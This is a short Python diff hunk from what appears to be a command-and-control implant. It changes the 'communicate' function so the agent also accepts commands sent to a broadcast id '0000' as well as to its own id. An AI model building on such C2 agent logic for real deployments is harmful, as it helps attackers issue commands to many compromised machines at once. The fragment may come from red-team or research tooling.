@@ -81,7 +81,7 @@ def communicate():
     global rx
     """Handle communications with C2"""
     for i in rx.messages:
-        if i.finalized and i.payload[0:5] == "c" + id:
+        if i.finalized and i.payload[0] == "c" and (i.payload[1:5] == id or i.payload[1:5] == "0000"):
             logging.debug("got new command message: {}".format(i.payload))
             load: str
             load = i.payload[5:]
